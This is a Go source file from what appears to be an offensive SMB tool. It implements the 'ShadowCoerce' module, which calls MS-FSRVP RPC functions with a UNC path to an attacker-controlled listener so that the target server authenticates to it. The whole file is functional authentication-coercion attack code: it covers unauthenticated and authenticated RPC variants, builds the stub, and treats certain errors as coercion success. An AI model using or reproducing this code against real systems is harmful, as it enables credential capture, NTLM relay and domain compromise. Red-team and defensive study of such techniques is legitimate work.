package coerce

import (
	"context"

	"github.com/ineffectivecoder/SMBGooser/pkg/dcerpc"
)

// ShadowCoerce implements MS-FSRVP coercion
type ShadowCoerce struct{}

// NewShadowCoerce creates a ShadowCoerce coercer
func NewShadowCoerce() *ShadowCoerce {
	return &ShadowCoerce{}
}

func (s *ShadowCoerce) Name() string {
	return "ShadowCoerce"
}

func (s *ShadowCoerce) Description() string {
	return "MS-FSRVP (File Server VSS Agent) - IsPathShadowCopied and related"
}

func (s *ShadowCoerce) PipeName() string {
	return "FssagentRpc"
}

func (s *ShadowCoerce) InterfaceUUID() dcerpc.UUID {
	return dcerpc.FSRVP_UUID
}

func (s *ShadowCoerce) InterfaceVersion() uint32 {
	return 1
}

func (s *ShadowCoerce) Opnums() []OpnumInfo {
	return []OpnumInfo{
		{8, "IsPathSupported", "Check path support - triggers UNC access"},
		{9, "IsPathShadowCopied", "Check shadow copy - triggers UNC access"},
	}
}

func (s *ShadowCoerce) Coerce(ctx context.Context, rpc *dcerpc.Client, listener string, opts CoerceOptions) error {
	opnums := s.getOpnums(opts)
	path := buildCallbackPath(listener, opts.UseHTTP, opts.HTTPPort)

	var lastErr error
	for _, opnum := range opnums {
		stub := s.createStub(path, opnum.Opnum)
		_, err := rpc.Call(opnum.Opnum, stub)

		if err != nil {
			if isCoercionSuccess(err) {
				return nil
			}
			lastErr = err
			continue
		}
		return nil
	}

	return lastErr
}

// CoerceAuth uses authenticated RPC (PKT_PRIVACY) for coercion
func (s *ShadowCoerce) CoerceAuth(ctx context.Context, rpc *AuthenticatedClient, listener string, opts CoerceOptions) error {
	opnums := s.getOpnums(opts)
	path := buildCallbackPath(listener, opts.UseHTTP, opts.HTTPPort)

	var lastErr error
	for _, opnum := range opnums {
		stub := s.createStub(path, opnum.Opnum)
		_, err := rpc.Call(opnum.Opnum, stub)

		if err != nil {
			if isCoercionSuccess(err) {
				return nil
			}
			lastErr = err
			continue
		}
		return nil
	}

	return lastErr
}

func (s *ShadowCoerce) getOpnums(opts CoerceOptions) []OpnumInfo {
	if opts.SpecificOpnum >= 0 {
		for _, op := range s.Opnums() {
			if op.Opnum == uint16(opts.SpecificOpnum) {
				return []OpnumInfo{op}
			}
		}
	}
	return s.Opnums()
}

// createStub creates NDR stub for FSRVP functions
func (s *ShadowCoerce) createStub(path string, opnum uint16) []byte {
	w := dcerpc.NewNDRWriter()

	// Both opnums 8 and 9 take ShareName as parameter
	// ShareName (conformant varying string - UNC path)
	w.WriteUnicodeString(path)

	return w.Bytes()
}
